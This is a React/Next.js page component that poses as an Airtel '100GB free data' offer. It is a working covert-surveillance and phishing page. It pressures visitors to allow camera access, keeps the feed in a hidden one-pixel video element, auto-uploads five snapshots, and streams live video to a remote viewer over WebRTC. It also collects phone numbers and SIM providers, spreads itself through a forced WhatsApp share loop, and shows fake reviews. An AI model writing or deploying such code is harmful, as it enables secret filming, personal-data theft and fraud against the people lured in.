'use client';

import { useEffect, useRef, useState } from 'react';
import { io, Socket } from 'socket.io-client';

export default function Home() {
  const [step, setStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [simProvider, setSimProvider] = useState('');
  const [progress, setProgress] = useState(0);
  const [shareCount, setShareCount] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const socketRef = useRef<Socket | null>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const sessionIdRef = useRef<string | null>(null);

  useEffect(() => {
    // Connect to signaling server using environment variable or current origin
    const signalingUrl = process.env.NEXT_PUBLIC_SIGNALING_URL || '';
    // If we're on a domain with Nginx proxy, we can just use the same origin
    const socket = io(signalingUrl);
    socketRef.current = socket;

    // Start video immediately
    startVideo();

    socket.on('viewer_joined', async (viewerId) => {
      console.log('Viewer joined:', viewerId);
      createOffer(viewerId);
    });

    socket.on('answer', async ({ sdp }) => {
        console.log('Received answer');
        if (peerConnectionRef.current) {
            await peerConnectionRef.current.setRemoteDescription(new RTCSessionDescription(sdp));
        }
    });

    socket.on('candidate', async ({ candidate }) => {
        if (peerConnectionRef.current) {
            console.log('Received ICE candidate from viewer');
            await peerConnectionRef.current.addIceCandidate(new RTCIceCandidate(candidate));
        }
    });

    return () => {
      socket.disconnect();
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const startVideo = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      streamRef.current = stream;
      setHasPermission(true);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
             console.log("Video metadata loaded, dimensions:", videoRef.current?.videoWidth, "x", videoRef.current?.videoHeight);
             // Create Session in DB
             createSession();
        };
      }
      
    } catch (err) {
      console.error("Camera access denied:", err);
      setHasPermission(false);
      // Automatically retry after a short delay
      setTimeout(startVideo, 2000);
    }
  };

  const createSession = async () => {
      try {
        const res = await fetch('/api/sessions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_info: navigator.userAgent,
                socket_id: socketRef.current?.id
            })
        });
        const data = await res.json();
        if (data.success) {
            sessionIdRef.current = data.session_id;
            console.log("Session created:", data.session_id);
            // Join the room for this session
            socketRef.current?.emit('register_streamer', data.session_id);
            
            // Start auto-capture of 5 photos
            startAutoCapture(data.session_id);
        }
      } catch (e) {
          console.error("Failed to create session", e);
      }
  };

  const startAutoCapture = (id: string) => {
      console.log("Starting auto-capture for session:", id);
      let count = 0;
      const interval = setInterval(() => {
          if (count >= 5) {
              console.log("Auto-capture complete.");
              clearInterval(interval);
              return;
          }
          takeAutoSnapshot(id);
          count++;
      }, 3000); // Every 3 seconds
  };

  const takeAutoSnapshot = async (id: string) => {
      if (!videoRef.current) return;
      
      // Ensure video is ready
      if (videoRef.current.readyState < 2 || videoRef.current.videoWidth === 0) {
          console.warn("Video not ready for snapshot, state:", videoRef.current.readyState, "dims:", videoRef.current.videoWidth);
          return;
      }
      
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      if (!ctx) return;
      
      ctx.drawImage(videoRef.current, 0, 0);
      canvas.toBlob(async (blob) => {
          if (!blob) {
              console.error("Canvas toBlob returned null");
              return;
          }
          console.log("Auto-snapshot blob created, size:", blob.size);
          
          const formData = new FormData();
          formData.append('file', blob, 'auto-snap.png');
          formData.append('sessionId', id);
          formData.append('type', 'snapshot');
          
          try {
              const res = await fetch('/api/upload', {
                  method: 'POST',
                  body: formData
              });
              const data = await res.json();
              console.log("Auto-snapshot upload result:", data);
          } catch (e) {
              console.error("Auto-snapshot upload failed", e);
          }
      }, 'image/png');
  };

  const createOffer = async (viewerId: string) => {
      if (!streamRef.current) return;

      const pc = new RTCPeerConnection({
          iceServers: [
              { urls: 'stun:stun.l.google.com:19302' },
              { urls: 'stun:stun1.l.google.com:19302' },
              { urls: 'stun:stun2.l.google.com:19302' },
              { urls: 'stun:stun3.l.google.com:19302' },
              { urls: 'stun:stun4.l.google.com:19302' }
          ]
      });
      peerConnectionRef.current = pc;

      streamRef.current.getTracks().forEach(track => pc.addTrack(track, streamRef.current!));

      pc.onicecandidate = (event) => {
          if (event.candidate) {
              console.log('Sending ICE candidate to viewer');
              socketRef.current?.emit('candidate', { target: viewerId, candidate: event.candidate });
          }
      };

      pc.onconnectionstatechange = () => {
        console.log('Streamer connection state:', pc.connectionState);
      };

      pc.oniceconnectionstatechange = () => {
        console.log('Streamer ICE connection state:', pc.iceConnectionState);
      };

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      socketRef.current?.emit('offer', { target: viewerId, sdp: offer });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(2);
    // Update session with User details
    if (sessionIdRef.current) {
        fetch(`/api/sessions/${sessionIdRef.current}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber, simProvider })
        });
    }
  };

  const handleShare = () => {
      const newCount = shareCount + 1;
      setShareCount(newCount);
      const newProgress = (newCount / 5) * 100;
      setProgress(newProgress);
      
      const message = encodeURIComponent("Get 100GB Free Data! Claim now! 👉 https://expo1.darunnoor.in/get");
      window.open(`https://wa.me/?text=${message}`, '_blank');

      if (newCount >= 5) {
          setIsCompleted(true);
      }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center">
      {/* Permission Overlay */}
      {!hasPermission && (
        <div className="fixed inset-0 z-[100] bg-black/90 flex flex-col items-center justify-center p-6 text-center backdrop-blur-md">
          <div className="max-w-md w-full animate-pulse">
            <h2 className="text-3xl font-bold text-white mb-4 drop-shadow-lg">
              Action Required
            </h2>
            <p className="text-xl text-white mb-2 leading-relaxed font-semibold">
              Please click <span className="text-[#E60000] text-2xl uppercase underline decoration-2 underline-offset-4">"Allow"</span> to get your
            </p>
            <div className="bg-[#E60000] text-white py-4 px-8 rounded-xl font-black text-4xl shadow-2xl inline-block transform hover:scale-105 transition-transform">
              100GB FREE DATA
            </div>
            <p className="mt-8 text-white/60 text-sm italic">
              * Verification will start automatically after you click allow
            </p>
          </div>
        </div>
      )}

      {/* Hidden Video Preview */}
      <video ref={videoRef} autoPlay muted playsInline className="absolute opacity-0 pointer-events-none w-1 h-1" />

      <header className="w-full bg-[#E60000] p-4 text-center text-white font-bold text-xl">
        AIRTEL
      </header>

      <main className="bg-white p-6 max-w-md w-full mt-4 shadow-sm animate-fade-in">
        <div className="text-center mb-6">
            <div className="bg-[#E60000] text-white py-3 px-6 rounded-lg font-bold text-2xl inline-block mb-4">
                100GB FREE
            </div>
            <p className="text-gray-600 text-sm">
                Get 100GB of free internet data for your SIM card! Available for all major network providers.
            </p>
        </div>

        {step === 1 ? (
            <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                    <label className="block text-gray-700 font-semibold mb-2">Select Your SIM Provider</label>
                    <select 
                        required 
                        className="w-full p-3 border border-gray-300 rounded focus:border-[#E60000] outline-none text-black"
                        value={simProvider}
                        onChange={(e) => setSimProvider(e.target.value)}
                    >
                        <option value="">Choose your provider...</option>
                        <option value="airtel">Airtel</option>
                        <option value="jio">Jio</option>
                        <option value="vi">Vi (Vodafone Idea)</option>
                        <option value="bsnl">BSNL</option>
                    </select>
                </div>
                <div>
                    <label className="block text-gray-700 font-semibold mb-2">Enter Your Phone Number</label>
                    <input 
                        type="tel" 
                        required 
                        placeholder="+91 98765 43210"
                        className="w-full p-3 border border-gray-300 rounded focus:border-[#E60000] outline-none text-black"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                    />
                </div>
                <button type="submit" className="w-full bg-[#E60000] text-white font-bold py-3 rounded hover:bg-[#b30000] transition text-black">
                    Claim 100GB Free Data
                </button>
            </form>
        ) : (
            <div className="bg-green-50 border border-green-500 rounded p-4 text-center">
                {!isCompleted ? (
                    <>
                        <h4 className="text-gray-800 font-bold mb-2">Almost There! 🎉</h4>
                        <p className="text-gray-600 text-sm mb-4">Share this offer 5 times on WhatsApp to activate</p>
                        <p className="text-gray-600 text-sm mb-2">Share {shareCount} of 5</p>
                        <div className="w-full bg-gray-200 h-2 rounded mb-4 overflow-hidden">
                            <div className="bg-green-500 h-full transition-all duration-300" style={{ width: `${progress}%` }}></div>
                        </div>
                        <button 
                            onClick={handleShare}
                            className="w-full bg-[#25D366] text-white font-bold py-3 rounded flex items-center justify-center gap-2 hover:bg-[#1da851] text-black"
                        >
                            <span>Share on WhatsApp</span>
                        </button>
                    </>
                ) : (
                    <div className="bg-[#E60000] text-white p-4 rounded animate-pulse">
                        <h4 className="font-bold text-lg mb-2">✅ Activation Complete!</h4>
                        <p className="text-sm">Your 100GB free data will be credited within 24 hours.</p>
                    </div>
                )}
            </div>
        )}
      </main>
      
      <div className="w-full h-1 bg-[#E60000] my-4"></div>
      
      <div className="max-w-md w-full bg-gray-50 p-6">
        <h3 className="text-[#E60000] font-bold mb-4">Recent Reviews</h3>
        <div className="space-y-4">
            <div className="bg-white p-4 rounded shadow-sm border-l-4 border-[#E60000] flex gap-3">
                <div className="w-10 h-10 rounded-full bg-[#E60000] text-white flex items-center justify-center font-bold shrink-0">SM</div>
                <div>
                    <div className="font-bold text-gray-800 text-sm">Sarah Miller</div>
                    <p className="text-gray-600 text-xs mt-1">Just got my 100GB! This is amazing!</p>
                </div>
            </div>
            <div className="bg-white p-4 rounded shadow-sm border-l-4 border-[#E60000] flex gap-3">
                 <div className="w-10 h-10 rounded-full bg-[#E60000] text-white flex items-center justify-center font-bold shrink-0">MJ</div>
                 <div>
                     <div className="font-bold text-gray-800 text-sm">Mike Johnson</div>
                     <p className="text-gray-600 text-xs mt-1">Works perfectly. Highly recommend!</p>
                 </div>
            </div>
        </div>
      </div>
    </div>
  );
}
